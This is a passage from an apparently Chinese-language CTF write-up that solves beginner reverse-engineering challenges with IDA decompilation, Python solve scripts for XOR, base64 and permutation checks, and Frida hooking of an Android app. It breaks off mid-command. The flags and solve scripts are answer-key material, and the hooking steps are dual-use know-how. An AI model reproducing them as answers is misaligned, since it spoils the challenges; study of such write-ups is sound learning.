class="line">  </span><br><span class="line">  </span><br><span class="line">key = (k1,k2)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(key,data)</span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Hello-Reverse"><a href="#Hello-Reverse" class="headerlink" title="Hello_Reverse"></a>Hello_Reverse</h2><p>查壳，发现无壳，PE64位文件，直接丢进IDA64。</p><p><img src="https://s2.loli.net/2023/08/04/zjlI5qfAxcwJ3X9.png" alt="image-20221006102306809.png"></p><p>按shift + F12，搜索整个文件的字符串，拿到前半截flag</p><p><img src="https://s2.loli.net/2023/08/04/C7xNFYzcJt3aodQ.png" alt="image-20221006103517648.png"></p><p>找到主函数，按f5反汇编得到后半段flag</p><p><img src="https://s2.loli.net/2023/08/04/5E6ICToumFZAPhU.png" alt="image-20221006105430891.png"></p><p>flag{h3llo_r3vers1ng_w0rld}</p><h2 id="Baby-Re"><a href="#Baby-Re" class="headerlink" title="Baby_Re"></a>Baby_Re</h2><p>查壳，是ELF64位的无壳程序。</p><p><img src="https://s2.loli.net/2023/08/04/kIg9A3QxdBea6nj.png" alt="image-20221006105534153.png"></p><p>观察main函数，按n稍微改变下变量名好观察，可以发现我们的输入异或了自身下标，随后进去compare函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)input = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to RE world,Can you solve the problem?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now you should input your flag and i&#x27;ll tell you if it is right:&quot;</span>, argv, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, *(_QWORD *)&amp;v9);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    len = i;</span><br><span class="line">    <span class="keyword">if</span> ( len &gt;= <span class="built_in">strlen</span>(input) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    input[i] ^= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">compare</span>(input) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well done! You find the secret!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The flag is wrong! Maybe something run before main&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察compare函数，可以发现其直接与密文比较，那么进入final与自身下标异或。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 __fastcall <span class="title">compare</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The length of flag is Wrong!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">final</span>[i] != input[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/CBa2SckuydUxFeZ.png" alt="image-20221006110403727.png"></p><p>异或后发现flag是错误的。</p><p>看hint，程序真的都是从main开始的吗？简单来说程序的运行流程</p><ul><li>Init -&gt; main</li></ul><p>对抗这种Init段该了些数值的办法一个是动调。</p><p>另一个就是 X！交叉引用</p><p><img src="https://ppppz.net/2022/10/01/%E3%80%90NewStarCTF%E3%80%91WEEK1-REVERSE/image-20221002145534839.png" alt="image-20221002145534839"></p><p>即可在目标地方发现了改了密文的地方，密文这几个位被更改了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void FunctionName()</span><br><span class="line">&#123;</span><br><span class="line">  final[6] = 54;</span><br><span class="line">  final[11] = 58;</span><br><span class="line">  final[22] = 38;</span><br><span class="line">  final[30] = 63;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么拿到正确密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">final=[<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x56</span>, <span class="number">0x36</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x3A</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, <span class="number">0x51</span>, <span class="number">0x7D</span>, <span class="number">0x65</span>, <span class="number">0x7F</span>, <span class="number">0x4D</span>, <span class="number">0x71</span>, </span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x65</span>, <span class="number">0x7D</span>, <span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0x7A</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x62</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(final[i]^i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{S0meth1ng_run_bef0re_main!}</p><h2 id="Pyre"><a href="#Pyre" class="headerlink" title="Pyre"></a>Pyre</h2><p>python程序逆向，用pyinstxtractor.py解包</p><p><img src="https://s2.loli.net/2023/08/04/weUMphRnHK9tFSu.png" alt="image-20221006114234166.png"></p><p>直接uncompyle6反编译pyc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.8 (tags/v3.8.8:024d805, Feb 19 2021, 13:08:11) [MSC v.1928 32 bit (Intel)]</span></span><br><span class="line"><span class="comment"># Embedded file name: pyre.py</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">encode = <span class="string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span></span><br><span class="line">table = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">        tmp += <span class="built_in">input</span>[table[i]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    flag = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">23</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Length Wrong!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final = enc(flag)</span><br><span class="line">        <span class="keyword">if</span> final == encode:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Wow,you get the right flag!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Sorry,Your input is Wrong&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling .\pyre.pyc</span></span><br></pre></td></tr></table></figure><p>分析代码，可以发现我们的输入只是进行了经过table表的下标混淆，直接经过table表还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>]</span><br><span class="line">flag = <span class="string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(flag[table.index(i)], end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>flag{PYRE_1S_S0_FUN!!!}</p><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>该程序从enc.dll中加载encode函数，我们的明文str经过encode加密而后与final进行比较。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> <span class="keyword">final</span>[<span class="number">100</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">100</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+100h] [rbp+80h] BYREF</span></span><br><span class="line">  Lpfunc encode; <span class="comment">// [rsp+170h] [rbp+F0h]</span></span><br><span class="line">  HMODULE handle; <span class="comment">// [rsp+178h] [rbp+F8h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="built_in">sizeof</span>(str));</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="built_in">sizeof</span>(input));</span><br><span class="line">  <span class="built_in">memset</span>(<span class="keyword">final</span>, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="keyword">final</span>));</span><br><span class="line">  <span class="built_in">memset</span>(<span class="keyword">final</span>, <span class="number">8</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">2</span>] = <span class="number">14</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">3</span>] = <span class="number">13</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">4</span>] = <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">5</span>] = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">6</span>] = <span class="number">17</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">7</span>] = <span class="number">17</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">8</span>] = <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">9</span>] = <span class="number">46</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">10</span>] = <span class="number">43</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">11</span>] = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">12</span>] = <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">13</span>] = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">15</span>] = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">16</span>] = <span class="number">59</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">17</span>] = <span class="number">61</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">18</span>] = <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">19</span>] = <span class="number">21</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">20</span>] = <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">21</span>] = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">22</span>] = <span class="number">80</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">23</span>] = <span class="number">70</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">24</span>] = <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">25</span>] = <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">26</span>] = <span class="number">57</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">27</span>] = <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">28</span>] = <span class="number">49</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">29</span>] = <span class="number">86</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">30</span>] = <span class="number">36</span>;</span><br><span class="line">  <span class="keyword">final</span>[<span class="number">31</span>] = <span class="number">28</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(&amp;<span class="keyword">final</span>[<span class="number">32</span>], <span class="string">&quot;?$P&lt;,%#K&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  handle = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;enc.dll&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !handle )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Dll Loading Failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  encode = <span class="number">0</span>i64;</span><br><span class="line">  encode = (Lpfunc)<span class="built_in">GetProcAddress</span>(handle, <span class="string">&quot;encode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !encode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Function Failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="built_in">encode</span>(input, str);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(str, <span class="keyword">final</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your input is right:)&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The flag is Wrong:(&quot;</span>);</span><br><span class="line">  <span class="built_in">FreeLibrary</span>(handle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该enc.dll拉进IDA分析encode函数，Ctrl + F 在函数框中 搜索函数。（为什么出现两个encode，这其实是C++逆向的特性，具体原因以后会慢慢明白）</p><p><img src="https://s2.loli.net/2023/08/04/4C9HMcpd2jtsVbx.png" alt="image-20221011154914716.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encode_0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_180021001);</span><br><span class="line">  v3 = <span class="built_in">j_strlen</span>(a1);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v5) = aAbcdefghijklmn[a1[v4] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">1</span>) = aAbcdefghijklmn[((a1[v4 + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (a1[v4] &amp; <span class="number">3</span>))];</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">2</span>) = aAbcdefghijklmn[((a1[v4 + <span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (a1[v4 + <span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">    *(_BYTE *)(a2 + v5 + <span class="number">3</span>) = aAbcdefghijklmn[a1[v4 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v4 += <span class="number">3</span>;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">1</span>) = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">2</span>) = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v5 - <span class="number">1</span>) = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_18001132A</span>(a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入aAbcdefghijklmn发现一串字符串，很明显的base64加密。</p><p><img src="https://s2.loli.net/2023/08/04/vG4bfctpj1XoUxQ.png" alt="image-20221011155015174.png"></p><p>随后return进入sub_18001132A函数，发现你逻辑是与一个字符串’Reverse’进行异或。</p><p><img src="https://s2.loli.net/2023/08/04/ATv4j1NVJktHwSG.png" alt="image-20221011155750852.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_180011660</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_180021001);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">j_strlen</span>(output); ++i )</span><br><span class="line">    output[i] ^= Str[i % <span class="built_in">j_strlen</span>(Str)];</span><br><span class="line">  <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么逆向的过程就是将密文异或字符串，再Base64解密即可。</p><p><img src="https://s2.loli.net/2023/08/04/YnFUQd2Hvcy7Xlg.png" alt="image-20221011161751552.png"></p><p>动调拿到数据。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pybase64</span><br><span class="line"><span class="built_in">str</span>=[<span class="number">8</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">40</span>, <span class="number">64</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">60</span>, <span class="number">46</span>, <span class="number">43</span>, <span class="number">30</span>, <span class="number">61</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">5</span>, <span class="number">80</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">42</span>, <span class="number">57</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">86</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">63</span>, <span class="number">36</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">37</span>, <span class="number">35</span>, <span class="number">75</span>]</span><br><span class="line">key=<span class="string">&#x27;Reverse&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">str</span>[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line">flag=pybase64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{Base64_1s_1nterestr1ng!!}</p><h2 id="艾克体悟题"><a href="#艾克体悟题" class="headerlink" title="艾克体悟题"></a>艾克体悟题</h2><p>apk逆向，jeb反汇编java。</p><p><img src="https://s2.loli.net/2023/08/04/giQBphajKW8fk4N.png" alt="image-20221011165109988.png"></p><p>在FlagActivity类里发现代码逻辑是当cnt大于10000就能得到flag。</p><p>这里有两种方法可以get flag</p><p><del>那么一个思路就是点一万下</del></p><p>另一个思路就是hook access$000 函数让该函数直接返回10000，判断就成立了，我们就GetFlag了</p><p>所以此时就可以用 Frida 了，就是在程序运行的时候 hook 返回值变为1000即可</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./data/local/tmp/frida-server # 进入shell Frida启动！</span><br></pre></td></tr></table></figure><p>再进入一个shell 启动指定控件</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n 